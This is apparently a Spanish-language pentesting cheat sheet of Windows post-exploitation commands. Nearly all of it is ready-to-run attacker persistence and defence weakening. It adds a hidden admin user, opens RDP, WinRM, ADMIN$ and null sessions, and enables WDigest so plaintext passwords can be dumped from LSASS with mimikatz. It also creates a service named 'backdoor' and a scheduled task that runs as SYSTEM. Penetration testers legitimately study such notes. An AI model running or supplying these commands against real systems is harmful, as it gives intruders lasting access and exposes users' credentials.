- Saber si estamos ante cmd ó powershell: 
	```powershell
	(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
	```
- Comprobar arquitectura de Windows
	- Sin privilegios: 
		```powershell
		$env:PROCESSOR_ARCHITECTURE	
		```
	- Con privilegios
		```powershell
		(Get-CimInstance Win32_OperatingSystem).OSArchitecture
		```
- Convertir en archivo de texto, supongamos `infoMimikatz`, con formato grepeable correcto (a veces la extracción de mimikatz da problemas)
	```bash
	dos2unix infoMimikatz
	# si no funciona
	dos2unix -f infoMimikatz
	```
- Convertir a teclado en español
	```powershell
	Set-WinUserLanguageList -LanguageList es-ES -Force
	```

## Con acceso de administrador a un sistema Windows
### Crear un usuario persistente con permisos de administrador
- **Crear un usuario:**
    ```powershell
    net user pentester StrongP@ssword123 /add
    ```
- **Añadir el usuario al grupo de administradores:**
    ```powershell
    net localgroup Administrators pentester /add
    ```
### Habilitar RDP (Escritorio Remoto)
- Habilitar RDP con `nxc`
	```bash
	nxc smb $IP -u administrator -p pass123 -M rdp -o ACTION=enable
	```
- **Habilitar conexiones RDP:**
    ```powershell
    # Desde CMD
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
    # Desde powershell
    Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0

    ```
- **Configurar el Firewall para permitir tráfico RDP:**
    ```powershell
    netsh advfirewall firewall set rule group="remote desktop" new enable=yes
    ```
### Activar el Modo Admin Restricto (Restricted Admin Mode para RDP)
```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```
### Evitar restricciones con `LocalAccountTokenFilterPolicy`
Permite que las cuentas locales se autentiquen remotamente y conserven sus privilegios administrativos sin restricciones adicionales. Útil para herramientas como `psexec` o `impacket-psexec`, ya que elimina limitaciones predeterminadas que podrían bloquear RCE. 
```powershell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```
### Habilitar y configurar `psexec` y herramientas basadas en SMB
Para operaciones administrativas avanzadas, como el uso de herramientas como `psexec`, **ADMIN$ debe estar habilitado**
- **Habilitar el servicio ADMIN$ (si está deshabilitado):**
    ```powershell
    sc config lanmanserver start= auto
    sc start lanmanserver
    ```
- **Abrir ADMIN$ para autenticación remota:**
    ```powershell
    net share ADMIN$=C:\Windows /grant:Administrators,FULL
    ```
### Habilitar PowerShell Remoting
Habilita WinRM automáticamente
```powershell
Enable-PSRemoting -Force
```
### Habilitar WinRM (para autenticación remota con PowerShell y herramientas como Evil-WinRM)
```powershell
winrm quickconfig -force
```
### Configurar autenticación sin contraseña (null sessions)
- **Deshabilitar restricciones de null sessions:**
    ```powershell
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d "C$\IPC$" /f
    ```
- **Opcional: Permitir null sessions a nivel de usuario:**
    ```powershell
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v RestrictNullSessAccess /t REG_DWORD /d 0 /f
    ```

### Habilitar autenticación WDigest (credenciales en texto claro en memoria)
Configura el sistema para almacenar credenciales en texto plano en memoria (LSASS). Si tras habilitar WDigest un usuario se conecta autentica en el sistema, tras volcar la sam, podremos extraer credenciales en texto claro con `sekurlsa::minidump lsass.dmp sekurlsa::logonpasswords`
```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```
### Configurar un servicio persistente con acceso remoto
```powershell
sc create backdoor binpath= "cmd.exe /k start cmd.exe" start= auto
```
### Habilitar credenciales almacenadas para acceso remoto
- Permite el uso de credenciales almacenadas para establecer conexiones remotas
	```powershell
	reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableDomainCreds /t REG_DWORD /d 0 /f
	```
- Después de esta configuración se pueden utilizar comandos como 
	```powershell
	cmdkey /add:target_machine /user:admin_user /pass:password123
	```
	Y conectarnos al sistema de manera remota sin tener que proporcionar credenciales nuevamente (facilita escenarios en los que el Double Hop puede limitar el acceso)
### Configurar una tarea programada maliciosa
- **Crear una tarea:**
    ```powershell
    schtasks /create /tn "PentestTask" /tr "cmd.exe /c whoami > C:\users\public\whoami.txt" /sc onlogon /ru SYSTEM
    ```
